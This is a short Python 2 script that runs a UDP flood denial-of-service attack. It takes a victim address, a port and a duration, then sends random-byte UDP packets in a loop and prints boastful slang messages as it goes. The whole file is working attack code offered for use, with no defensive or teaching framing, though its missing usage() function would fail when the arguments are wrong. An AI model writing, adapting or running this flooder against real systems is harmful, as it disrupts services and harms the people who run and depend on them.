#!/usr/bin/env python2
import time
import socket
import random
import sys

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1000 representes one byte to the server
    bytes = random._urandom(1000)
    byte = random._urandom(1024)
    byt = random._urandom(1060)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        client.sendto(byte, (victim, vport))
        client.sendto(byt, (victim, vport))
        sent = sent + 1
        print " CJEY1557 NI BOSS!!! %s TOK TOK PAKET LEWAT !! %s PORT %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()